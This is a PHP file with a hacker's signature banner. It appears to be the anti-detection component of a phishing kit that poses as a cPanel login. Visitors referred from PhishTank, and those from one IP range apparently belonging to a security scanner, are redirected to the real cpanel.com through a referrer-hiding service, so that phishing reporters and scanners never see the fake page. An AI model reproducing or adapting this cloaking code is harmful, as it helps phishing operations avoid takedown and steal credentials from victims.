<?php

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Wells -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 Wells             $#
###############################################

**/
### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		    header("Location: https://utilify.me/hide-referrer/http://www.cpanel.com");
		    die();
		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		    header("Location: https://utilify.me/hide-referrer/http://www.cpanel.com");
		    die();
		}
		}

 ### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
	   header("Location: https://utilify.me/hide-referrer/http://www.cpanel.com");
	   die();
	 }

?>